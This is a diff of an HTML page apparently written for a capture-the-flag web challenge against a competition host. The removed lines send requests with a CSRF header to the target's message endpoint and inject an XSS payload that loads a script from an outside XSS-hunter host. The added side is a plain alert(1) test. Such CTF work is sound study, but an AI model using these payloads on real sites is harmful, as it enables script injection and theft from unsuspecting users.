@@ -1,43 +1,5 @@
 <html>
-  <head>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-  </head>
 <body>
-<script>
-csrf_header = new Headers();
-csrf_header.append('CSRF-Protection', '1');
-
-function httpGet()
-{
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", 'https://joe.web.ctfcompetition.com', true ); // false for synchronous request
-    xmlHttp.setRequestHeader( 'Access-Control-Allow-Origin', '*');
-    xmlHttp.withCredentials = false;
-    xmlHttp.send( null );
-}
-  
-function sendMessage(msg) {
-  
-  var u = 'https://joe.web.ctfcompetition.com/message?msg=' + encodeURIComponent(msg);
- 
-  $.ajax({ 
-   type : "GET", 
-   url : u, 
-   beforeSend: function(xhr){xhr.setRequestHeader('CSRF-Protection', '1');},
-   success : function(result) { 
-       //set your variable to the result 
-   }, 
-   error : function(result) { 
-     //handle the error 
-   } 
-   });
-
-}
-  
-httpGet();  
-sendMessage("let me rename you");
-var a= decodeURI('%22%3E%3Cscript%20src=https://hrj.xss.ht%3E%3C/script%3E');
-sendMessage(a);
-</script>
+  <script>alert(1)</script>
 </body>
 </html>
